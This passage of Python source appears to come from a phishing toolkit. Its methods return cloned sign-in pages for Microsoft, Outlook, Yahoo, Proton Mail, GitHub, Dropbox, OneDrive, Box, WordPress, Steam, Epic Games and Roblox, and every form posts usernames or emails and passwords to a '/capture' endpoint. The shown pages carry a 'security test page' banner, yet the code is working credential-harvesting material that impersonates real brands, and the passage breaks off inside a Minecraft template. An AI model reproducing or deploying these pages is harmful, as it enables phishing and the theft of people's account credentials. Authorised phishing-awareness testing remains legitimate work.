        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 2px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><svg viewBox="0 0 108 23"><rect x="0" y="0" width="23" height="23" fill="#F25022"/><rect x="27" y="0" width="23" height="23" fill="#7FBA00"/><rect x="0" y="27" width="23" height="23" fill="#00A4EF"/><rect x="27" y="27" width="23" height="23" fill="#FFB900"/></svg></div>
            <h1>Sign in</h1>
            <div class="subtitle">to continue to Microsoft account</div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email, phone, or Skype" required></div>
                <div class="no-account"><a href="#">No account? Create one!</a></div>
                <div class="signin-options"><a href="#">Sign-in options</a></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="actions"><button type="submit" class="next-btn">Sign in</button></div>
            </form>
            <div class="footer"><a href="#">Terms of use</a><a href="#">Privacy & cookies</a><span>© Microsoft 2024</span></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_outlook_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Outlook - Sign In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #0078d4; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 440px; width: 100%; }
        .login-box { background: #fff; border-radius: 4px; padding: 40px; box-shadow: 0 4px 16px rgba(0,0,0,0.2); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo h1 { color: #0078d4; font-size: 36px; font-weight: 300; }
        h2 { font-size: 24px; font-weight: 400; margin-bottom: 20px; color: #1e1e1e; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #8a8886; border-radius: 2px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #0078d4; }
        .remember { margin: 15px 0; }
        .remember label { color: #1e1e1e; font-size: 14px; }
        button { width: 100%; padding: 12px; background: #0078d4; color: #fff; border: none; border-radius: 2px; font-size: 16px; cursor: pointer; }
        button:hover { background: #106ebe; }
        .links { text-align: center; margin-top: 20px; }
        .links a { color: #0078d4; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #0078d4; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>Outlook</h1></div>
            <h2>Sign in to Outlook</h2>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email address" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Keep me signed in</label></div>
                <button type="submit">Sign in</button>
                <div class="links"><a href="#">Forgot password?</a></div>
            </form>
            <div class="signup"><a href="#">Create an account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_yahoo_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Yahoo - Sign In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #f0f0f0; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 150px; height: 40px; }
        .login-box { background: #fff; border-radius: 8px; padding: 40px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h1 { font-size: 28px; font-weight: 400; margin-bottom: 30px; color: #410093; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #6001d3; }
        .stay-signed { display: flex; align-items: center; margin: 15px 0; }
        .stay-signed input { margin-right: 8px; }
        button { width: 100%; padding: 12px; background: #6001d3; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #410093; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #6001d3; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; }
        .signup a { color: #6001d3; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 150 40"><text x="20" y="30" fill="#6001d3" font-size="28" font-weight="bold">YAHOO!</text></svg></div>
        <div class="login-box">
            <h1>Sign in</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Yahoo ID (e.g., username@yahoo.com)" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="stay-signed"><input type="checkbox" id="stay"><label for="stay">Stay signed in</label></div>
                <button type="submit">Sign in</button>
                <div class="links"><a href="#">Forgot username?</a> | <a href="#">Forgot password?</a></div>
            </form>
            <div class="signup"><a href="#">Create an account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_protonmail_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Proton Mail: Log in</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: linear-gradient(135deg, #1b1340 0%, #2a2250 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 180px; height: 40px; }
        .login-box { background: #fff; border-radius: 12px; padding: 40px; box-shadow: 0 20px 40px rgba(0,0,0,0.3); }
        h1 { font-size: 24px; font-weight: 500; margin-bottom: 30px; color: #1b1340; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #4a4a4a; font-size: 14px; font-weight: 500; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #6d4aff; }
        .options { display: flex; justify-content: space-between; align-items: center; margin: 20px 0; }
        .remember { display: flex; align-items: center; }
        .remember input { margin-right: 8px; }
        .forgot a { color: #6d4aff; text-decoration: none; font-size: 14px; }
        button { width: 100%; padding: 14px; background: #6d4aff; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #5f3eff; }
        .signup { text-align: center; margin-top: 30px; }
        .signup p { color: #666; font-size: 14px; }
        .signup a { color: #6d4aff; text-decoration: none; font-weight: 600; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 8px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 180 40"><text x="20" y="30" fill="white" font-size="24" font-weight="bold">Proton Mail</text></svg></div>
        <div class="login-box">
            <h1>Log in to your account</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><label>Username or Email</label><input type="text" name="email" placeholder="username@proton.me" required></div>
                <div class="form-group"><label>Password</label><input type="password" name="password" placeholder="••••••••" required></div>
                <div class="options"><div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div><div class="forgot"><a href="#">Forgot password?</a></div></div>
                <button type="submit">Log in</button>
            </form>
            <div class="signup"><p>Don't have an account? <a href="#">Create one</a></p></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_github_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>GitHub: Let's build from here</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background: #0d1117; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 340px; width: 100%; }
        .logo { text-align: center; margin-bottom: 20px; }
        .logo svg { width: 48px; height: 48px; fill: #fff; }
        .login-box { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 20px; }
        h1 { font-size: 24px; font-weight: 300; margin-bottom: 20px; color: #f0f6fc; text-align: center; }
        .form-group { margin-bottom: 16px; }
        label { display: block; margin-bottom: 6px; color: #f0f6fc; font-size: 14px; font-weight: 400; }
        input[type="text"], input[type="password"] { width: 100%; padding: 8px 12px; background: #0d1117; border: 1px solid #30363d; border-radius: 6px; color: #f0f6fc; font-size: 14px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #2f81f7; }
        button { width: 100%; padding: 8px 16px; background: #238636; color: #fff; border: none; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; margin: 16px 0; }
        button:hover { background: #2ea043; }
        .forgot-password { text-align: center; margin: 16px 0; }
        .forgot-password a { color: #2f81f7; text-decoration: none; font-size: 12px; }
        .create-account { text-align: center; border-top: 1px solid #30363d; padding-top: 16px; margin-top: 16px; }
        .create-account a { color: #2f81f7; text-decoration: none; font-size: 14px; }
        .footer { text-align: center; margin-top: 40px; color: #8b949e; font-size: 12px; }
        .footer a { color: #8b949e; text-decoration: none; margin: 0 8px; }
        .warning { margin-top: 20px; padding: 12px; background: #2d1b1e; border: 1px solid #f85149; border-radius: 6px; color: #f85149; text-align: center; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 24 24"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.825 1.125.825 2.265 0 1.635-.015 2.955-.015 3.36 0 .315.225.69.825.57C20.565 21.795 24 17.295 24 12c0-6.63-5.37-12-12-12z"/></svg></div>
        <div class="login-box">
            <h1>Sign in to GitHub</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><label>Username or email address</label><input type="text" name="username" required></div>
                <div class="form-group"><label>Password</label><input type="password" name="password" required></div>
                <button type="submit">Sign in</button>
                <div class="forgot-password"><a href="#">Forgot password?</a></div>
            </form>
            <div class="create-account"><a href="#">Create an account</a></div>
        </div>
        <div class="footer"><a href="#">Terms</a><a href="#">Privacy</a><a href="#">Security</a><a href="#">Contact GitHub</a></div>
        <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
    </div>
</body>
</html>"""
    
    def _get_dropbox_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Dropbox - Sign in</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Atlas Grotesk', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background: #f7f5f2; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 40px; }
        .logo svg { width: 150px; height: 40px; }
        .login-box { background: #fff; border-radius: 12px; padding: 40px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h1 { font-size: 28px; font-weight: 500; margin-bottom: 30px; color: #1e1919; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #e6e3e0; border-radius: 8px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #0061fe; }
        .options { display: flex; justify-content: space-between; align-items: center; margin: 20px 0; }
        .remember { display: flex; align-items: center; }
        .remember input { margin-right: 8px; }
        .forgot a { color: #0061fe; text-decoration: none; font-size: 14px; }
        button { width: 100%; padding: 14px; background: #0061fe; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #0052d6; }
        .signup { text-align: center; margin-top: 30px; }
        .signup a { color: #0061fe; text-decoration: none; font-weight: 500; }
        .footer { text-align: center; margin-top: 30px; color: #6b635c; font-size: 12px; }
        .footer a { color: #6b635c; text-decoration: none; margin: 0 5px; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 8px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 150 40"><text x="20" y="30" fill="#0061fe" font-size="24" font-weight="bold">Dropbox</text></svg></div>
        <div class="login-box">
            <h1>Sign in</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email or phone number" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="options"><div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div><div class="forgot"><a href="#">Forgot password?</a></div></div>
                <button type="submit">Sign in</button>
            </form>
            <div class="signup"><a href="#">Create an account</a></div>
            <div class="footer"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_onedrive_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>OneDrive</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #0378d4; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 440px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 150px; height: 40px; }
        .login-box { background: #fff; border-radius: 4px; padding: 44px; box-shadow: 0 4px 16px rgba(0,0,0,0.2); }
        h1 { font-size: 24px; font-weight: 600; margin-bottom: 20px; color: #1e1e1e; }
        .form-group { margin-bottom: 16px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 10px; border: 1px solid #8a8886; border-radius: 2px; font-size: 15px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #0067b8; }
        .remember { margin: 15px 0; }
        .remember label { color: #1e1e1e; font-size: 14px; }
        button { width: 100%; padding: 12px; background: #0067b8; color: #fff; border: none; border-radius: 2px; font-size: 15px; cursor: pointer; }
        button:hover { background: #0058a5; }
        .forgot { text-align: center; margin: 20px 0; }
        .forgot a { color: #0067b8; text-decoration: none; font-size: 13px; }
        .signup { text-align: center; }
        .signup a { color: #0067b8; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 150 40"><text x="20" y="30" fill="white" font-size="24" font-weight="bold">OneDrive</text></svg></div>
        <div class="login-box">
            <h1>Sign in to OneDrive</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email address" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Keep me signed in</label></div>
                <button type="submit">Sign in</button>
                <div class="forgot"><a href="#">Forgot password?</a></div>
            </form>
            <div class="signup"><a href="#">Create an account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_box_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Box | Sign In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #0061d5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 120px; height: 40px; }
        .login-box { background: #fff; border-radius: 8px; padding: 40px; box-shadow: 0 4px 16px rgba(0,0,0,0.2); }
        h1 { font-size: 28px; font-weight: 300; margin-bottom: 30px; color: #1e1e1e; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #0061d5; }
        .remember { margin: 15px 0; }
        .remember label { color: #666; font-size: 14px; }
        button { width: 100%; padding: 14px; background: #0061d5; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #0052b0; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #0061d5; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; }
        .signup a { color: #0061d5; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 120 40"><text x="20" y="30" fill="white" font-size="24" font-weight="bold">Box</text></svg></div>
        <div class="login-box">
            <h1>Sign in to Box</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email address" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div>
                <button type="submit">Sign in</button>
                <div class="links"><a href="#">Forgot password?</a></div>
            </form>
            <div class="signup"><a href="#">Create an account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_wordpress_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>WordPress.com</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 150px; height: 40px; }
        .login-box { background: #fff; border-radius: 8px; padding: 40px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 30px; color: #23282d; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #0087be; }
        .remember { display: flex; align-items: center; margin: 15px 0; }
        .remember input { margin-right: 8px; }
        button { width: 100%; padding: 14px; background: #0087be; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #0073aa; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #0087be; text-decoration: none; font-size: 14px; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #0087be; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 4px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 150 40"><text x="20" y="30" fill="#23282d" font-size="24" font-weight="bold">WordPress.com</text></svg></div>
        <div class="login-box">
            <h1>Log in to your account</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Username or Email" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div>
                <button type="submit">Log In</button>
                <div class="links"><a href="#">Lost your password?</a></div>
            </form>
            <div class="signup"><a href="#">Create a new account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    # ==================== GAMING TEMPLATES ====================
    
    def _get_steam_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Steam Login</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Motiva Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #1b2838; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 150px; height: 50px; }
        .login-box { background: #2a475e; border-radius: 4px; padding: 40px; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
        h1 { font-size: 26px; font-weight: 300; margin-bottom: 30px; color: #fff; text-align: center; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 12px; background: #1e3a4f; border: 1px solid #1e3a4f; border-radius: 4px; color: #fff; font-size: 15px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #66c0f4; }
        input::placeholder { color: #8f98a0; }
        .remember { display: flex; align-items: center; margin: 15px 0; }
        .remember input { margin-right: 8px; }
        .remember label { color: #8f98a0; font-size: 13px; }
        button { width: 100%; padding: 12px; background: linear-gradient(to bottom, #799905, #536904); color: #d2e885; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; text-shadow: 0 1px 0 rgba(0,0,0,0.3); }
        button:hover { background: linear-gradient(to bottom, #89a505, #637a05); }
        .qr-login { text-align: center; margin: 20px 0; }
        .qr-login a { color: #66c0f4; text-decoration: none; font-size: 13px; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #66c0f4; text-decoration: none; font-size: 13px; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #66c0f4; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #572c2c; border: 1px solid #b33a3a; border-radius: 4px; color: #ff9999; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 150 50"><text x="20" y="35" fill="white" font-size="28" font-weight="bold">STEAM</text></svg></div>
        <div class="login-box">
            <h1>Sign in</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Steam Account Name" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me on this computer</label></div>
                <button type="submit">Sign in</button>
                <div class="qr-login"><a href="#">Use QR code to log in</a></div>
                <div class="links"><a href="#">Forgot your password?</a></div>
            </form>
            <div class="signup"><a href="#">Create a free account</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_epicgames_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Epic Games - Sign In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Inter', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #121212; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 40px; }
        .logo svg { width: 150px; height: 50px; }
        .login-box { background: #202020; border-radius: 8px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        h1 { font-size: 24px; margin-bottom: 30px; color: #fff; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; background: #2b2b2b; border: 1px solid #404040; border-radius: 4px; color: #fff; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #0078f2; }
        .remember { display: flex; align-items: center; margin: 15px 0; }
        .remember input { margin-right: 8px; }
        .remember label { color: #aaa; font-size: 14px; }
        button { width: 100%; padding: 14px; background: #0078f2; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; }
        button:hover { background: #0066d1; }
        .links { margin: 20px 0; text-align: center; }
        .links a { color: #0078f2; text-decoration: none; font-size: 14px; }
        .qr-login { text-align: center; margin: 20px 0; }
        .qr-login a { color: #0078f2; text-decoration: none; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #0078f2; text-decoration: none; }
        .warning { margin-top: 20px; padding: 12px; background: #332211; border: 1px solid #0078f2; border-radius: 4px; color: #99ccff; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 150 50"><text x="20" y="35" fill="white" font-size="24" font-weight="bold">EPIC GAMES</text></svg></div>
        <div class="login-box">
            <h1>Sign In</h1>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="email" placeholder="Email address" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <div class="remember"><input type="checkbox" id="remember"><label for="remember">Remember me</label></div>
                <button type="submit">Sign In</button>
                <div class="qr-login"><a href="#">Sign in with QR code</a></div>
                <div class="links"><a href="#">Forgot your password?</a></div>
            </form>
            <div class="signup"><a href="#">Sign up</a></div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_roblox_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Roblox</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Builder Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
        .container { max-width: 400px; width: 100%; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 150px; height: 50px; }
        .login-box { background: #fff; border-radius: 20px; padding: 40px; box-shadow: 0 4px 16px rgba(0,0,0,0.1); }
        h1 { font-size: 28px; margin-bottom: 10px; color: #393b3d; text-align: center; }
        .subtitle { color: #777; text-align: center; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; outline: none; }
        input[type="text"]:focus, input[type="password"]:focus { border-color: #00a2ff; }
        button { width: 100%; padding: 14px; background: #00a2ff; color: #fff; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin: 10px 0; }
        button:hover { background: #0091e0; }
        .qr-login { text-align: center; margin: 15px 0; }
        .qr-login a { color: #00a2ff; text-decoration: none; font-size: 14px; }
        .links { text-align: center; margin: 15px 0; }
        .links a { color: #00a2ff; text-decoration: none; font-size: 14px; margin: 0 10px; }
        .signup { text-align: center; margin-top: 20px; }
        .signup a { color: #00a2ff; text-decoration: none; font-weight: 600; }
        .footer { text-align: center; margin-top: 20px; color: #777; font-size: 12px; }
        .warning { margin-top: 20px; padding: 12px; background: #fff3cd; border: 1px solid #ffeeba; border-radius: 8px; color: #856404; text-align: center; font-size: 13px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo"><svg viewBox="0 0 150 50"><text x="20" y="35" fill="#00a2ff" font-size="28" font-weight="bold">Roblox</text></svg></div>
        <div class="login-box">
            <h1>Welcome!</h1>
            <div class="subtitle">Sign in to Roblox</div>
            <form method="POST" action="/capture">
                <div class="form-group"><input type="text" name="username" placeholder="Username" required></div>
                <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                <button type="submit">Log In</button>
                <div class="qr-login"><a href="#">Use QR code to log in</a></div>
                <div class="links"><a href="#">Forgot password</a><a href="#">Forgot username</a></div>
            </form>
            <div class="signup"><a href="#">Sign up for Roblox</a></div>
            <div class="footer">© 2024 Roblox Corporation</div>
            <div class="warning">⚠️ This is a security test page. Do not enter real credentials.</div>
        </div>
    </div>
</body>
</html>"""
    
    def _get_minecraft_template(self):
        return """<!DOCTYPE html>
<html>
<head>
    <title>Minecraft - Sign In</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
